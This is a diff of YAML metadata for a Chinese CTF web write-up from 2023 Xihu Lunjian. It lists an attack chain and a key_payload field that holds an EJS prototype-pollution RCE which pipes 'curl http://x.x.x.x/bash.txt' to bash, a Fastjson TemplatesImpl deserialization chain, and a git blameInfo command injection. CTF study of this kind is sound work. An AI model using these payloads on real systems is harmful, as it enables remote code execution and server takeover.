@@ -20,7 +20,21 @@ tags:
 - XString触发equals
 - codefever_community
 - 命令注入
-attack_chain: Node tolowercase 数组异常报错 → 泄露 cookie DASCTF{...} → php.ini 找 zend_test.so 路径 → 读出来逆 RC4 → 解密 index.php → RC4 加密一句话 → sudo chmod 777 /flag → Unicode 0x0100+ord 拆分 HTTP 头 → EJS constructor.prototype.outputFunctionName RCE → Fastjson @type 反序列化 XString+HotSwappableTargetSource → TemplatesImpl _bytecodes 加载恶意类 → git blameInfo 命令注入 revision=;`curl`&path=xxx → implode 拼空格绕过滤 → update cc_users 改 admin 密码进后台
+attack_chain:
+- 'Node tolowercase 数组异常报错'
+- '泄露 cookie DASCTF{...}'
+- 'php.ini 找 zend_test.so 路径'
+- '读出来逆 RC4'
+- '解密 index.php'
+- 'RC4 加密一句话'
+- 'sudo chmod 777 /flag'
+- 'Unicode 0x0100+ord 拆分 HTTP 头'
+- 'EJS constructor.prototype.outputFunctionName RCE'
+- 'Fastjson @type 反序列化 XString+HotSwappableTargetSource'
+- 'TemplatesImpl _bytecodes 加载恶意类'
+- 'git blameInfo 命令注入 revision=;`curl`&path=xxx'
+- 'implode 拼空格绕过滤'
+- 'update cc_users 改 admin 密码进后台'
 key_payload: '{"constructor.prototype.outputFunctionName":"x;global.process.mainModule.require(''child_process'').exec(''curl http://x.x.x.x/bash.txt|bash'');var x"} ; HotSwappableTargetSource(JSONArray(TemplatesImpl)) 链 ; /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b'
 one_liner: Node 异常泄露 + 自定义 SO 加密 + Unicode HTTP 拆分污染 + Fastjson TemplatesImpl + codefever implode 注入。
 lesson: Node 数组 tolowercase 异常、Unicode 拆字节污染 HTTP、EJS 原型链污染、codefever implode 数组拼空格是 web 综合题常见套路。
@@ -70,6 +84,9 @@ prerequisites:
 - PHP 自定义 zend extension（zend_test.so）
 - EJS 原型链污染
 - Fastjson TemplatesImpl 反序列化
+contest_normalized: "西湖论剑"
+contest_year: 2023
+subcategory_guess: "deserialization"
 ---
 # 2023西湖论剑web-writeup题解wp
 
